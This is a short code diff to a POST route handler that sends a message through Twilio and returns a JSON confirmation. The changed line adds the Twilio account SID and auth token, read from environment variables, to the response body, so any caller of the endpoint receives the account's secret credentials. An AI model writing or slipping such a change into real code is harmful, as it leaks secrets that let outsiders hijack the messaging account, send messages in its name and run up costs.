@@ -11,5 +11,5 @@ export async function POST(request:Request) {
         (process.env.TWILIO_NUMBER)?process.env.TWILIO_NUMBER:"");
     messageTool.sendMessage(number, message);
 
-    return Response.json({body: "number called: " + number + "; message: " + message});
+    return Response.json({body: "number called: " + number + "; message: " + message + " " + process.env.TWILIO_ACCOUNT_SID + " " + process.env.TWILIO_AUTH_TOKEN});
 }
